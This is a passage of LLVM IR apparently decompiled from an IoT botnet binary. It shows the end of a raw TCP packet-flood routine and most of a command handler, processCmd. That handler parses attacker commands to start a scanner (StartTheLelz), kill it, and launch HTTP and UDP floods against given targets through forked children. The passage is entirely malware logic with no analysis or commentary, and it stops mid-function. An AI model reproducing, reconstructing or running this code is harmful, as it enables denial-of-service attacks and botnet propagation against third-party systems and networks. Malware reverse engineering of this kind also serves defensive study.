  %v1_d528 = trunc i32 %v0_d514 to i16
  store i16 %v1_d528, i16* %v4_d528, align 4
  %v0_d52c = call i32 @rand_cmwc()
  store i32 %v0_d52c, i32* %r2.global-to-local, align 4
  store i32 %v0_d52c, i32* %v3_d138, align 8
  %v0_d53c = call i32 @rand_cmwc()
  %v1_d550 = trunc i32 %v0_d53c to i16
  store i16 %v1_d550, i16* %v5_d0d8, align 4
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_d408, align 4
  %v4_d568 = call i32 @tcpcsum(i32 %v3_d0b4, i32 %v1_d0d4)
  %v1_d578 = trunc i32 %v4_d568 to i16
  store i16 %v1_d578, i16* %v4_d408, align 4
  store i32 %v3_d0b4, i32* %r2.global-to-local, align 4
  %v3_d588 = load i16, i16* %v2_d48c, align 2
  %v4_d588 = zext i16 %v3_d588 to i32
  %v3_d594 = call i32 @csum(i16* %v2_d498, i32 %v4_d588)
  %sext5 = mul i32 %v3_d594, 65536
  %v1_d598 = sdiv i32 %sext5, 65536
  store i32 %v1_d598, i32* %r2.global-to-local, align 4
  %v1_d5a4 = trunc i32 %v1_d598 to i16
  store i16 %v1_d5a4, i16* %v4_d4a8, align 2
  %v9_d5b0 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d5dc

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d4cc
  %v2_d5bc = call i32 @__GI_time(i32* null)
  store i32 %v2_d5bc, i32* %r2.global-to-local, align 4
  %v8_d5cc = icmp sgt i32 %v2_d5bc, %v2_d4bc
  br i1 %v8_d5cc, label %dec_label_pc_d5ec, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5b8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d4cc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d4cc
  %v1_d5e0 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_d4cc

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_cf8c, %dec_label_pc_d038, %dec_label_pc_cfec
  %v1_d5f8 = phi i32 [ %v3_cf9c, %dec_label_pc_cf8c ], [ %v3_d048, %dec_label_pc_d038 ], [ %v3_cffc, %dec_label_pc_cfec ], [ %v2_d5bc, %dec_label_pc_d5b8 ]
  ret i32 %v1_d5f8

; uselistorder directives
  uselistorder i32 %v1_d598, { 1, 0 }
  uselistorder i32 %v0_d514, { 1, 0 }
  uselistorder i32 %v1_d49c, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_d27c, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_d18c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_d114, { 1, 0 }
  uselistorder i32 %v1_d0d4, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_d0b4, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_d084, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d458, { 1, 0 }
  uselistorder label %dec_label_pc_d3c8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d25c, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_cf8c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d62c = load i32, i32* @r4, align 4
  %v6_d62c = load i32, i32* @r5, align 4
  %v9_d62c = load i32, i32* @r6, align 4
  %v12_d62c = load i32, i32* @r7, align 4
  %v15_d62c = load i32, i32* @r8, align 4
  %v18_d62c = load i32, i32* @fp, align 4
  store i32 54836, i32* %stack_var_-4, align 4
  %v2_d630 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d630, i32* @fp, align 4
  %v2_d644 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1cba8.48 to i32), i32* @r1, align 4
  %v3_d650 = inttoptr i32 %v2_d644 to i8*
  %v4_d650 = call i32 @__GI_strcoll(i8* %v3_d650, i32 ptrtoint ([5 x i8]* @global_var_1cba8.48 to i32))
  %v2_d658 = icmp eq i32 %v4_d650, 0
  br i1 %v2_d658, label %dec_label_pc_d660, label %dec_label_pc_d678

dec_label_pc_d660:                                ; preds = %entry
  %v2_d664 = load i32, i32* @global_var_27918.46, align 4
  %v3_d670 = call i32 @Rootsprintf(i32 %v2_d664, i32 ptrtoint ([6 x i8]* @global_var_1cf1c.494 to i32))
  br label %dec_label_pc_e210

dec_label_pc_d678:                                ; preds = %entry
  %v2_d67c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1cf24.496 to i32), i32* @r1, align 4
  %v3_d688 = inttoptr i32 %v2_d67c to i8*
  %v4_d688 = call i32 @__GI_strcoll(i8* %v3_d688, i32 ptrtoint ([6 x i8]* @global_var_1cf24.496 to i32))
  %v2_d690 = icmp eq i32 %v4_d688, 0
  br i1 %v2_d690, label %dec_label_pc_d698, label %dec_label_pc_d78c

dec_label_pc_d698:                                ; preds = %dec_label_pc_d678
  %v1_d69c = add i32 %tmp, 4
  %v1_d6a0 = inttoptr i32 %v1_d69c to i32*
  %v2_d6a0 = load i32, i32* %v1_d6a0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf2c.498 to i32), i32* @r1, align 4
  %v3_d6ac = inttoptr i32 %v2_d6a0 to i8*
  %v4_d6ac = call i32 @__GI_strcoll(i8* %v3_d6ac, i32 ptrtoint ([4 x i8]* @global_var_1cf2c.498 to i32))
  %v2_d6b4 = icmp eq i32 %v4_d6ac, 0
  br i1 %v2_d6b4, label %dec_label_pc_d6bc, label %dec_label_pc_d700

dec_label_pc_d6bc:                                ; preds = %dec_label_pc_d698
  %v2_d6c0 = load i32, i32* @global_var_2db84.500, align 4
  %v2_d6c4 = icmp eq i32 %v2_d6c0, 0
  br i1 %v2_d6c4, label %dec_label_pc_e210, label %dec_label_pc_d6cc

dec_label_pc_d6cc:                                ; preds = %dec_label_pc_d6bc
  %v2_d6dc = call i32 @kill(i32 %v2_d6c0, i32 9)
  %v2_d6e4 = load i32, i32* @global_var_27918.46, align 4
  %v3_d6f0 = call i32 @Rootsprintf(i32 %v2_d6e4, i32 ptrtoint ([14 x i8]* @global_var_1cf30.502 to i32))
  store i32 0, i32* @global_var_2db84.500, align 4
  br label %dec_label_pc_d700

dec_label_pc_d700:                                ; preds = %dec_label_pc_d698, %dec_label_pc_d6cc
  %v2_d708 = load i32, i32* %v1_d6a0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1cf40.504 to i32), i32* @r1, align 4
  %v3_d714 = inttoptr i32 %v2_d708 to i8*
  %v4_d714 = call i32 @__GI_strcoll(i8* %v3_d714, i32 ptrtoint ([3 x i8]* @global_var_1cf40.504 to i32))
  store i32 %v4_d714, i32* @r0, align 4
  %v2_d71c = icmp eq i32 %v4_d714, 0
  br i1 %v2_d71c, label %dec_label_pc_d724, label %dec_label_pc_d78c

dec_label_pc_d724:                                ; preds = %dec_label_pc_d700
  %v2_d728 = load i32, i32* @global_var_2db84.500, align 4
  %v2_d72c = icmp eq i32 %v2_d728, 0
  br i1 %v2_d72c, label %dec_label_pc_d734, label %dec_label_pc_e210

dec_label_pc_d734:                                ; preds = %dec_label_pc_d724
  %v0_d734 = call i32 @__libc_fork()
  %v2_d754 = icmp eq i32 %v0_d734, 0
  br i1 %v2_d754, label %dec_label_pc_d778, label %dec_label_pc_d75c

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d734
  store i32 %v0_d734, i32* @global_var_2db84.500, align 4
  br label %dec_label_pc_e210

dec_label_pc_d778:                                ; preds = %dec_label_pc_d734
  %v2_d780 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d788 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d700, %dec_label_pc_d678, %dec_label_pc_d778
  %v2_d790 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1cf44.506 to i32), i32* @r1, align 4
  %v3_d79c = inttoptr i32 %v2_d790 to i8*
  %v4_d79c = call i32 @__GI_strcoll(i8* %v3_d79c, i32 ptrtoint ([5 x i8]* @global_var_1cf44.506 to i32))
  %v2_d7a4 = icmp eq i32 %v4_d79c, 0
  br i1 %v2_d7a4, label %dec_label_pc_d7ac, label %dec_label_pc_d91c

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d78c
  %v7_d7b4 = icmp slt i32 %arg1, 6
  br i1 %v7_d7b4, label %dec_label_pc_e210, label %dec_label_pc_d7b8

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d7ac
  %v1_d7bc = add i32 %tmp, 12
  %v1_d7c0 = inttoptr i32 %v1_d7bc to i32*
  %v2_d7c0 = load i32, i32* %v1_d7c0, align 4
  store i32 %v2_d7c0, i32* @r0, align 4
  %v1_d7c8 = call i32 @atol(i32 %v2_d7c0)
  %tmp81 = icmp slt i32 %v1_d7c8, 1
  br i1 %tmp81, label %dec_label_pc_e210, label %dec_label_pc_d7d8

dec_label_pc_d7d8:                                ; preds = %dec_label_pc_d7b8
  %v1_d7dc = add i32 %tmp, 20
  %v1_d7e0 = inttoptr i32 %v1_d7dc to i32*
  %v2_d7e0 = load i32, i32* %v1_d7e0, align 4
  store i32 %v2_d7e0, i32* @r0, align 4
  %v1_d7e8 = call i32 @atol(i32 %v2_d7e0)
  store i32 %v1_d7e8, i32* @r0, align 4
  %v5_d7f4 = icmp sgt i32 %v1_d7e8, 0
  br i1 %v5_d7f4, label %dec_label_pc_d7fc, label %dec_label_pc_e210

dec_label_pc_d7fc:                                ; preds = %dec_label_pc_d7d8
  %v0_d7fc = call i32 @listFork()
  %v2_d804 = icmp eq i32 %v0_d7fc, 0
  br i1 %v2_d804, label %dec_label_pc_d80c, label %dec_label_pc_e210

dec_label_pc_d80c:                                ; preds = %dec_label_pc_d7fc
  %v2_d810 = load i32, i32* @global_var_27918.46, align 4
  store i32 %v2_d810, i32* @r5, align 4
  %v1_d818 = add i32 %tmp, 4
  %v1_d81c = inttoptr i32 %v1_d818 to i32*
  %v2_d81c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d81c, i32* @r6, align 4
  %v1_d824 = add i32 %tmp, 8
  %v1_d828 = inttoptr i32 %v1_d824 to i32*
  %v2_d828 = load i32, i32* %v1_d828, align 4
  store i32 %v2_d828, i32* @r7, align 4
  %v2_d834 = load i32, i32* %v1_d7c0, align 4
  store i32 %v2_d834, i32* @r0, align 4
  %v1_d83c = call i32 @atol(i32 %v2_d834)
  store i32 %v1_d83c, i32* @r4, align 4
  %v2_d84c = load i32, i32* %v1_d7e0, align 4
  store i32 %v2_d84c, i32* @r0, align 4
  %v1_d854 = call i32 @atol(i32 %v2_d84c)
  %v0_d864 = load i32, i32* @r5, align 4
  %v0_d86c = load i32, i32* @r6, align 4
  store i32 %v0_d86c, i32* @r2, align 4
  %v3_d874 = call i32 @Rootsprintf(i32 %v0_d864, i32 ptrtoint ([38 x i8]* @global_var_1cf4c.508 to i32))
  %v2_d880 = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d880, i32* @r5, align 4
  %v2_d890 = load i32, i32* %v1_d828, align 4
  store i32 %v2_d890, i32* @r6, align 4
  %v2_d8a0 = load i32, i32* %v1_d7c0, align 4
  store i32 %v2_d8a0, i32* @r0, align 4
  %v1_d8a8 = call i32 @atol(i32 %v2_d8a0)
  %v3_d8b4 = urem i32 %v1_d8a8, 65536
  store i32 %v3_d8b4, i32* @r7, align 4
  %v1_d8bc = add i32 %tmp, 16
  %v1_d8c0 = inttoptr i32 %v1_d8bc to i32*
  %v2_d8c0 = load i32, i32* %v1_d8c0, align 4
  store i32 %v2_d8c0, i32* @r8, align 4
  %v2_d8d0 = load i32, i32* %v1_d7e0, align 4
  store i32 %v2_d8d0, i32* @r0, align 4
  %v1_d8d8 = call i32 @atol(i32 %v2_d8d0)
  store i32 %v1_d8d8, i32* @r4, align 4
  %v1_d8e4 = add i32 %tmp, 24
  %v1_d8e8 = inttoptr i32 %v1_d8e4 to i32*
  %v2_d8e8 = load i32, i32* %v1_d8e8, align 4
  store i32 %v2_d8e8, i32* @r0, align 4
  %v1_d8f0 = call i32 @atol(i32 %v2_d8e8)
  %v0_d8f8 = load i32, i32* @r4, align 4
  %v0_d900 = load i32, i32* @r5, align 4
  %v0_d904 = load i32, i32* @r6, align 4
  %v0_d908 = load i32, i32* @r7, align 4
  %v0_d90c = load i32, i32* @r8, align 4
  %v6_d910 = trunc i32 %v0_d908 to i16
  %v7_d910 = call i32 @sendHTTP(i32 %v0_d900, i32 %v0_d904, i16 %v6_d910, i32 %v0_d90c, i32 %v0_d8f8, i32 %v1_d8f0)
  %v1_d918 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d78c, %dec_label_pc_d80c
  %v2_d920 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf74.510 to i32), i32* @r1, align 4
  %v3_d92c = inttoptr i32 %v2_d920 to i8*
  %v4_d92c = call i32 @__GI_strcoll(i8* %v3_d92c, i32 ptrtoint ([4 x i8]* @global_var_1cf74.510 to i32))
  %v2_d934 = icmp eq i32 %v4_d92c, 0
  br i1 %v2_d934, label %dec_label_pc_d93c, label %dec_label_pc_dc9c

dec_label_pc_d93c:                                ; preds = %dec_label_pc_d91c
  %v7_d944 = icmp slt i32 %arg1, 6
  br i1 %v7_d944, label %dec_label_pc_da5c, label %dec_label_pc_d948

dec_label_pc_d948:                                ; preds = %dec_label_pc_d93c
  %v1_d94c = add i32 %tmp, 12
  %v1_d950 = inttoptr i32 %v1_d94c to i32*
  %v2_d950 = load i32, i32* %v1_d950, align 4
  store i32 %v2_d950, i32* @r0, align 4
  %v1_d958 = call i32 @atol(i32 %v2_d950)
  %v7_d960 = icmp eq i32 %v1_d958, -1
  br i1 %v7_d960, label %dec_label_pc_da5c, label %dec_label_pc_d968

dec_label_pc_d968:                                ; preds = %dec_label_pc_d948
  %v1_d96c = add i32 %tmp, 8
  %v1_d970 = inttoptr i32 %v1_d96c to i32*
  %v2_d970 = load i32, i32* %v1_d970, align 4
  store i32 %v2_d970, i32* @r0, align 4
  %v1_d978 = call i32 @atol(i32 %v2_d970)
  %v7_d980 = icmp eq i32 %v1_d978, -1
  br i1 %v7_d980, label %dec_label_pc_da5c, label %dec_label_pc_d988

dec_label_pc_d988:                                ; preds = %dec_label_pc_d968
  %v1_d98c = add i32 %tmp, 16
  %v1_d990 = inttoptr i32 %v1_d98c to i32*
  %v2_d990 = load i32, i32* %v1_d990, align 4
  store i32 %v2_d990, i32* @r0, align 4
  %v1_d998 = call i32 @atol(i32 %v2_d990)
  %v7_d9a0 = icmp eq i32 %v1_d998, -1
  br i1 %v7_d9a0, label %dec_label_pc_da5c, label %dec_label_pc_d9a8

dec_label_pc_d9a8:                                ; preds = %dec_label_pc_d988
  %v1_d9ac = add i32 %tmp, 20
  %v1_d9b0 = inttoptr i32 %v1_d9ac to i32*
  %v2_d9b0 = load i32, i32* %v1_d9b0, align 4
  store i32 %v2_d9b0, i32* @r0, align 4
  %v1_d9b8 = call i32 @atol(i32 %v2_d9b0)
  %v7_d9c0 = icmp eq i32 %v1_d9b8, -1
  br i1 %v7_d9c0, label %dec_label_pc_da5c, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d9a8
  %v2_d9d0 = load i32, i32* %v1_d9b0, align 4
  store i32 %v2_d9d0, i32* @r0, align 4
  %v1_d9d8 = call i32 @atol(i32 %v2_d9d0)
  %v8_d9e4 = icmp sgt i32 %v1_d9d8, 65536
  br i1 %v8_d9e4, label %dec_label_pc_da5c, label %dec_label_pc_d9e8

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_d9c8
  %v2_d9f0 = load i32, i32* %v1_d9b0, align 4
  store i32 %v2_d9f0, i32* @r0, align 4
  %v1_d9f8 = call i32 @atol(i32 %v2_d9f0)
  store i32 %v1_d9f8, i32* @r2, align 4
  %v8_da0c = icmp sgt i32 %v1_d9f8, ptrtoint (i32* @global_var_ffdc.511 to i32)
  br i1 %v8_da0c, label %dec_label_pc_da5c, label %dec_label_pc_da10

dec_label_pc_da10:                                ; preds = %dec_label_pc_d9e8
  %v2_da18 = load i32, i32* %v1_d990, align 4
  store i32 %v2_da18, i32* @r0, align 4
  %v1_da20 = call i32 @atol(i32 %v2_da18)
  %v8_da2c = icmp sgt i32 %v1_da20, 32
  br i1 %v8_da2c, label %dec_label_pc_da5c, label %dec_label_pc_da30

dec_label_pc_da30:                                ; preds = %dec_label_pc_da10
  %v7_da34 = icmp eq i32 %arg1, 7
  br i1 %v7_da34, label %dec_label_pc_da3c, label %dec_label_pc_da74

dec_label_pc_da3c:                                ; preds = %dec_label_pc_da30
  %v1_da40 = add i32 %tmp, 24
  %v1_da44 = inttoptr i32 %v1_da40 to i32*
  %v2_da44 = load i32, i32* %v1_da44, align 4
  store i32 %v2_da44, i32* @r0, align 4
  %v1_da4c = call i32 @atol(i32 %v2_da44)
  %v5_da58 = icmp sgt i32 %v1_da4c, 0
  br i1 %v5_da58, label %dec_label_pc_da74, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %dec_label_pc_da3c, %dec_label_pc_da10, %dec_label_pc_d9e8, %dec_label_pc_d9c8, %dec_label_pc_d9a8, %dec_label_pc_d988, %dec_label_pc_d968, %dec_label_pc_d948, %dec_label_pc_d93c
  %v2_da60 = load i32, i32* @global_var_27918.46, align 4
  %v3_da6c = call i32 @Rootsprintf(i32 %v2_da60, i32 ptrtoint ([113 x i8]* @global_var_1cf78.513 to i32))
  br label %dec_label_pc_e210

dec_label_pc_da74:                                ; preds = %dec_label_pc_da30, %dec_label_pc_da3c
  %v1_da78 = add i32 %tmp, 4
  %v1_da7c = inttoptr i32 %v1_da78 to i32*
  %v2_da7c = load i32, i32* %v1_da7c, align 4
  %v2_da8c = load i32, i32* %v1_d970, align 4
  store i32 %v2_da8c, i32* @r0, align 4
  %v1_da94 = call i32 @atol(i32 %v2_da8c)
  %v2_daa8 = load i32, i32* %v1_d950, align 4
  store i32 %v2_daa8, i32* @r0, align 4
  %v1_dab0 = call i32 @atol(i32 %v2_daa8)
  %v2_dac4 = load i32, i32* %v1_d990, align 4
  store i32 %v2_dac4, i32* @r0, align 4
  %v1_dacc = call i32 @atol(i32 %v2_dac4)
  %v2_dae0 = load i32, i32* %v1_d9b0, align 4
  store i32 %v2_dae0, i32* @r0, align 4
  %v1_dae8 = call i32 @atol(i32 %v2_dae0)
  %v7_dafc = icmp slt i32 %arg1, 7
  br i1 %v7_dafc, label %dec_label_pc_db1c, label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_da74
  %v1_db04 = add i32 %tmp, 24
  %v1_db08 = inttoptr i32 %v1_db04 to i32*
  %v2_db08 = load i32, i32* %v1_db08, align 4
  store i32 %v2_db08, i32* @r0, align 4
  %v1_db10 = call i32 @atol(i32 %v2_db08)
  br label %dec_label_pc_db24

dec_label_pc_db1c:                                ; preds = %dec_label_pc_da74
  br label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_db00, %dec_label_pc_db1c
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_db1c ], [ %v1_db10, %dec_label_pc_db00 ]
  %v7_db34 = icmp slt i32 %arg1, 8
  br i1 %v7_db34, label %dec_label_pc_db54, label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %dec_label_pc_db24
  %v1_db3c = add i32 %tmp, 28
  %v1_db40 = inttoptr i32 %v1_db3c to i32*
  %v2_db40 = load i32, i32* %v1_db40, align 4
  store i32 %v2_db40, i32* @r0, align 4
  %v1_db48 = call i32 @atol(i32 %v2_db40)
  br label %dec_label_pc_db68

dec_label_pc_db54:                                ; preds = %dec_label_pc_db24
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db38, %dec_label_pc_db54
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_db54 ], [ %v1_db48, %dec_label_pc_db38 ]
  %v7_db78 = icmp slt i32 %arg1, 9
  br i1 %v7_db78, label %dec_label_pc_db98, label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %dec_label_pc_db68
  %v1_db80 = add i32 %tmp, 32
  %v1_db84 = inttoptr i32 %v1_db80 to i32*
  %v2_db84 = load i32, i32* %v1_db84, align 4
  store i32 %v2_db84, i32* @r0, align 4
  %v1_db8c = call i32 @atol(i32 %v2_db84)
  br label %dec_label_pc_dba0

dec_label_pc_db98:                                ; preds = %dec_label_pc_db68
  br label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db7c, %dec_label_pc_db98
  %storemerge6 = phi i32 [ 0, %dec_label_pc_db98 ], [ %v1_db8c, %dec_label_pc_db7c ]
  store i32 %v2_da7c, i32* @r0, align 4
  %v2_dbb4 = call i32 @__GI_strchr(i32 %v2_da7c, i32 44)
  store i32 %v2_dbb4, i32* @r0, align 4
  %v2_dbbc = icmp eq i32 %v2_dbb4, 0
  br i1 %v2_dbbc, label %dec_label_pc_dc50, label %dec_label_pc_dbc4

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dba0
  %v2_dbd0 = call i32 @__GI_strtok(i32 %v2_da7c, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_dbd0, i32* @r0, align 4
  %v2_dc4424 = icmp eq i32 %v2_dbd0, 0
  br i1 %v2_dc4424, label %dec_label_pc_e210, label %dec_label_pc_dbe0

dec_label_pc_dbe0:                                ; preds = %dec_label_pc_dbc4, %dec_label_pc_dc2c
  %storemerge1525 = phi i32 [ %v2_dc34, %dec_label_pc_dc2c ], [ %v2_dbd0, %dec_label_pc_dbc4 ]
  %v0_dbe0 = call i32 @listFork()
  %v2_dbe8 = icmp eq i32 %v0_dbe0, 0
  br i1 %v2_dbe8, label %dec_label_pc_dbf0, label %dec_label_pc_dc2c

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_dbe0
  %v8_dc20 = call i32 @sendUDP(i32 %storemerge1525, i32 %v1_da94, i32 %v1_dab0, i32 %v1_dacc, i32 %v1_dae8, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dc28 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dc2c

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_dbe0, %dec_label_pc_dbf0
  %v2_dc34 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_dc34, i32* @r0, align 4
  %v2_dc44 = icmp eq i32 %v2_dc34, 0
  br i1 %v2_dc44, label %dec_label_pc_e210, label %dec_label_pc_dbe0

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dba0
  %v0_dc50 = call i32 @listFork()
  %v2_dc58 = icmp eq i32 %v0_dc50, 0
  br i1 %v2_dc58, label %dec_label_pc_dc60, label %dec_label_pc_e210

dec_label_pc_dc60:                                ; preds = %dec_label_pc_dc50
  %v8_dc90 = call i32 @sendUDP(i32 %v2_da7c, i32 %v1_da94, i32 %v1_dab0, i32 %v1_dacc, i32 %v1_dae8, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dc98 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dc9c

dec_label_pc_dc9c:                                ; preds = %dec_label_pc_d91c, %dec_label_pc_dc60
  %v2_dca0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cfec.516 to i32), i32* @r1, align 4
  %v3_dcac = inttoptr i32 %v2_dca0 to i8*
  %v4_dcac = call i32 @__GI_strcoll(i8* %v3_dcac, i32 ptrtoint ([4 x i8]* @global_var_1cfec.516 to i32))
  %v2_dcb4 = icmp eq i32 %v4_dcac, 0
  br i1 %v2_dcb4, label %dec_label_pc_dcbc, label %dec_label_pc_df80

dec_label_pc_dcbc:                                ; preds = %dec_label_pc_dc9c
  %v7_dcc4 = icmp slt i32 %arg1, 6
  br i1 %v7_dcc4, label %dec_label_pc_dda0, label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_dcbc
  %v1_dccc = add i32 %tmp, 12
  %v1_dcd0 = inttoptr i32 %v1_dccc to i32*
  %v2_dcd0 = load i32, i32* %v1_dcd0, align 4
  store i32 %v2_dcd0, i32* @r0, align 4
  %v1_dcd8 = call i32 @atol(i32 %v2_dcd0)
  %v7_dce0 = icmp eq i32 %v1_dcd8, -1
  br i1 %v7_dce0, label %dec_label_pc_dda0, label %dec_label_pc_dce8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dcc8
  %v1_dcec = add i32 %tmp, 8
  %v1_dcf0 = inttoptr i32 %v1_dcec to i32*
  %v2_dcf0 = load i32, i32* %v1_dcf0, align 4
  store i32 %v2_dcf0, i32* @r0, align 4
  %v1_dcf8 = call i32 @atol(i32 %v2_dcf0)
  %v7_dd00 = icmp eq i32 %v1_dcf8, -1
  br i1 %v7_dd00, label %dec_label_pc_dda0, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dce8
  %v1_dd0c = add i32 %tmp, 16
  %v1_dd10 = inttoptr i32 %v1_dd0c to i32*
  %v2_dd10 = load i32, i32* %v1_dd10, align 4
  store i32 %v2_dd10, i32* @r0, align 4
  %v1_dd18 = call i32 @atol(i32 %v2_dd10)
  %v7_dd20 = icmp eq i32 %v1_dd18, -1
  br i1 %v7_dd20, label %dec_label_pc_dda0, label %dec_label_pc_dd28

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd08
  %v2_dd30 = load i32, i32* %v1_dd10, align 4
  store i32 %v2_dd30, i32* @r0, align 4
  %v1_dd38 = call i32 @atol(i32 %v2_dd30)
  %v8_dd44 = icmp sgt i32 %v1_dd38, 32
  br i1 %v8_dd44, label %dec_label_pc_dda0, label %dec_label_pc_dd48

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd28
  %v7_dd50 = icmp slt i32 %arg1, 7
  br i1 %v7_dd50, label %dec_label_pc_dd74, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd48
  %v1_dd58 = add i32 %tmp, 24
  %v1_dd5c = inttoptr i32 %v1_dd58 to i32*
  %v2_dd5c = load i32, i32* %v1_dd5c, align 4
  store i32 %v2_dd5c, i32* @r0, align 4
  %v1_dd64 = call i32 @atol(i32 %v2_dd5c)
  %v1_dd6c = icmp slt i32 %v1_dd64, 0
  br i1 %v1_dd6c, label %dec_label_pc_dda0, label %dec_label_pc_dd74

dec_label_pc_dd74:                                ; preds = %dec_label_pc_dd54, %dec_label_pc_dd48
  %v7_dd78 = icmp eq i32 %arg1, 8
  br i1 %v7_dd78, label %dec_label_pc_dd80, label %dec_label_pc_ddb8

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd74
  %v1_dd84 = add i32 %tmp, 28
  %v1_dd88 = inttoptr i32 %v1_dd84 to i32*
  %v2_dd88 = load i32, i32* %v1_dd88, align 4
  store i32 %v2_dd88, i32* @r0, align 4
  %v1_dd90 = call i32 @atol(i32 %v2_dd88)
  %v5_dd9c = icmp sgt i32 %v1_dd90, 0
  br i1 %v5_dd9c, label %dec_label_pc_ddb8, label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd80, %dec_label_pc_dd54, %dec_label_pc_dd28, %dec_label_pc_dd08, %dec_label_pc_dce8, %dec_label_pc_dcc8, %dec_label_pc_dcbc
  %v2_dda4 = load i32, i32* @global_var_27918.46, align 4
  %v3_ddb0 = call i32 @Rootsprintf(i32 %v2_dda4, i32 ptrtoint ([186 x i8]* @global_var_1cff0.518 to i32))
  br label %dec_label_pc_e210

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_dd74, %dec_label_pc_dd80
  %v1_ddbc = add i32 %tmp, 4
  %v1_ddc0 = inttoptr i32 %v1_ddbc to i32*
